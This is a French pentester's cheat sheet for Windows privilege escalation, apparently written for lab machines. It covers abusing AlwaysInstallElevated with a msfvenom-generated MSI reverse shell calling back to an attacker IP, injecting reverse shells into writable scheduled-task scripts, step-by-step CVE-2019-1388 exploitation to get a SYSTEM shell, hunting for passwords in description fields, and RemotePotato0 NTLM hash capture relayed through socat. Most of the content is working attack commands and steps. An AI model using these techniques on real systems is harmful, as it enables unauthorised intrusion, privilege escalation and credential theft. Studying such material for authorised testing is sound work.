
- [ ] [[#Always Install Elevated]]
- [ ] [[#Scheduled Tasks]]
- [ ] [[#CVE-2019-1388]]
- [ ] [[#User/Computer Description Field]]
- [ ] [[#Mount VHDX/VMDK]]
- [ ] [[#Cross Session Relais]]



# Always Install Elevated

> [!TIP]
> Installe les .msi en tant que SYSTEM
> Les 2 clés de registre suivantes doivent être présentes:
> - HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
> - HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

1. Vérifier que les 2 clés de registres sont présentes

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```powershell-session
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```


2. Générer un reverse shell au format msi avec msfvenom

```shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```


ou ajouter user Admin avec PowerUp -> [[POWERUP (Services - Registre)#Always Install Elevated]]

---
# Scheduled Tasks

1. Identifier les taches planifiées

```powershell-session
Get-ScheduledTask | select TaskName,State
```

```cmd
schtasks /query /fo LIST /v
```

```cmd
.\accesschk64.exe /accepteula -s -w -u <user> C:\Windows\System32\Tasks\*
```

2. Check des permissions sur un dossier avec AccessChk (Sysinternals).

```cmd
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

3. Si scripts exécutés et modifiable, y injecter un reverse shell par exemple.



---

# CVE-2019-1388

> [!TIP]
> Premet de lancer le navigateur en tant que SYSTEM

HHUPD.exe

https://packetstorm.news/files/id/14437


1. Télécharger hhupd.exe -> https://packetstorm.news/files/id/14437
2. Clique droit exécuter en tant qu'administrateur
3. Afficher plus de détails
4. Infos sur le certificat de l'éditeur
5. Onglet Detail > Confirmer la présence de SpcSpAgencyInfo
6. Onglet General -> Cliquer sur le lien hypertext dans Issued By
7. Cliquer sur OK
8. Lancer Taskmgr
9. Dans l'onglet Details -> Identifier que le navigateur est lancé en SYSTEM
10. Aller sur le navigateur
11. CTRL + S
12. cmd dans l'UNC Path

---

# User/Computer Description Field

> [!TIP]
> Peut contenir des mots de passe.
> 

Description utilisateur

```powershell-session
Get-LocalUser
```

Description ordinateur

```powershell-session
Get-WmiObject -Class Win32_OperatingSystem | select Description
```



---
# Mount VHDX/VMDK


### Linux

Monter VMDK sous Linux

```shell
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

Monter VHD/VHDX sous Linux

```shell
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

### Windows

Monter VHD sous windows -> Clique droit -> Monter

Monter VMDK sous windows -> Clique droit -> Map Virtual Disk


https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/

---
# Cross Session Relais

## RemotePotato

https://github.com/antonioCoco/RemotePotato0

https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/remotepotato/

Permet de forcer un utilisateur connecté de manière interactive à se connecter à un serveur en utilisant l'authentification NTLM exploitant le service RPC.

1. Utiliser RunasCs en logontype 9 (/netonly) pour identifier les sessions en cours.

```powershell
.\RunasCs.exe user 'password' -l 9 "qwinsta"
```

2. Passer RemotePotato0 sur la machine cible.

3. Lancer Socat sur notre machine linux afin de rediriger le trafic entrant sur le port 135 vers le port 9999 de la machine cible (Fonctionne comme JuicyPotato)

```sh
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<target_ip>:9999
```

4. Exécuter RemotePotato0 en mode 2 (rpc hash capture)

```powershell
.\RemotePotato0.exe -m 2 -s <session_id> -x <our_kali_ip> -p 9999
```